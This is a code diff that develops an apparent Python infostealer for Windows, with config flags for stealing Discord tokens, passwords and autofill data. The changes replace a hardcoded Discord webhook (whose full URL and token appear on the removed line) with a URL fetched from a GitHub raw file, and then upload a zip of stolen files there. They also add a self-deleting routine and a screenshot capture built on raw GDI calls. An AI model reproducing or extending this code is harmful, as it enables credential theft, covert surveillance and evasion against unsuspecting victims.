@@ -1,5 +1,4 @@
 CONFIG = {
-    "webhook": "https://discord.com/api/webhooks/1343173600454377482/X4Lv8uWTow9D6662EeSEQoaOvVt0gUe5MLhabEYfVQHjZtoUK2amRVPfmkscL6Ym2PU5",
     "discord": True,
     "passwords": True,
     "autofills": True,
@@ -26,6 +25,7 @@ import sqlite3
 import zipfile
 import platform
 import subprocess
+import ctypes.wintypes
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ============================================================================================= SYSTEM =============================================================================================================== #
@@ -74,12 +74,16 @@ class log:
 def InstallPackages(packages):
     for package in packages:
         log.info(f"Installing package {package}")
-        subprocess.run([PYTHON_CMD, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        try:
+            subprocess.run([PYTHON_CMD, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        except:
+            subprocess.run(["pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
-InstallPackages(packages=["requests", "pycryptodome", "pyautogui", "pyperclip"])
+InstallPackages(packages=["requests", "pycryptodome", "pyperclip", "pillow"])
 import requests
 import pyperclip
-import pyautogui
+
+from PIL import Image
 from Crypto.Cipher import AES
 
 def KillProcess(processName):
@@ -88,14 +92,15 @@ def KillProcess(processName):
         return
 
     subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    log.info(f"Process {processName} has been terminated")
+    log.info(f"{processName} has been terminated")
 
 def SafeRemove(path):
     try:
         if os.path.exists(path):
             os.remove(path)
+            log.info(f"{path} has been deleted")
     except Exception as e:
-        pass
+        log.error(f"{path} cannot be deleted : {e}")
 
 def ListFileInDir(directory, maxDepth=1):
     finalFiles = []
@@ -132,7 +137,8 @@ def GetFolderSize(path):
     return total_size
 
 def AutoDelete():
-    pass
+    subprocess.Popen(["cmd.exe", "/C", "ping", "localhost", "-n", "5", "&&", "del", "/F", f"\"{__file__}\""])
+    sys.exit()
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ============================================================================================= DISCORD ============================================================================================================== #
@@ -504,10 +510,35 @@ fileMaxSize = 4194304
 filesToSteal = []
 totalFiles = 0
 
+class BITMAPINFOHEADER(ctypes.Structure):
+    _fields_ = [("biSize", ctypes.wintypes.DWORD),("biWidth", ctypes.wintypes.LONG),("biHeight", ctypes.wintypes.LONG),("biPlanes", ctypes.wintypes.WORD),("biBitCount", ctypes.wintypes.WORD),("biCompression", ctypes.wintypes.DWORD),("biSizeImage", ctypes.wintypes.DWORD),("biXPelsPerMeter", ctypes.wintypes.LONG),("biYPelsPerMeter", ctypes.wintypes.LONG),("biClrUsed", ctypes.wintypes.DWORD),("biClrImportant", ctypes.wintypes.DWORD),]
+
 if CONFIG["screenshot"]:
     try:
-        screenshot = pyautogui.screenshot()
-        screenshot.save(f"{CONTAINER_FOLDER_PATH}\\.desktop.png")
+        user32 = ctypes.windll.user32
+        gdi32 = ctypes.windll.gdi32
+        screen_width = user32.GetSystemMetrics(0)
+        screen_height = user32.GetSystemMetrics(1)
+        hdc_screen = user32.GetDC(0)
+        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
+        hbm = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
+        gdi32.SelectObject(hdc_mem, hbm)
+        gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
+        bmp_info = BITMAPINFOHEADER()
+        bmp_info.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+        bmp_info.biWidth = screen_width
+        bmp_info.biHeight = -screen_height
+        bmp_info.biPlanes = 1
+        bmp_info.biBitCount = 32
+        bmp_info.biCompression = 0
+        buffer_size = screen_width * screen_height * 4
+        buffer = ctypes.create_string_buffer(buffer_size)
+        gdi32.GetDIBits(hdc_screen, hbm, 0, screen_height, buffer, ctypes.byref(bmp_info), 0)
+        gdi32.DeleteObject(hbm)
+        gdi32.DeleteDC(hdc_mem)
+        user32.ReleaseDC(0, hdc_screen)
+        image = Image.frombuffer("RGB", (screen_width, screen_height), buffer, "raw", "BGRX", 0, 1)
+        image.save(f"{CONTAINER_FOLDER_PATH}\\.desktop.png")
         totalFiles += 1
     except Exception as e:
         log.error(f"The screenshot encountered an error : {e}")
@@ -578,9 +609,12 @@ payload = {"embeds": [embed]}
 with open(ZIP_PATH, "rb") as zipFileToSend:
     fileReady = {"file": zipFileToSend}
     try:
-        res = requests.post(CONFIG["webhook"], files=fileReady, data={"payload_json": json.dumps(payload)})
+        req = requests.get("https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/main/snake.txt")
+        log.info("Webhook is OK")
+        res = requests.post(req.text.strip(), files=fileReady, data={"payload_json": json.dumps(payload)})
+        log.info("Data sent")
     except Exception as e:
-        log.error("Error with the webhook")
+        log.error(f"Webhook error : {e}")
 
 SafeRemove(ZIP_PATH)
 SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.desktop.png")
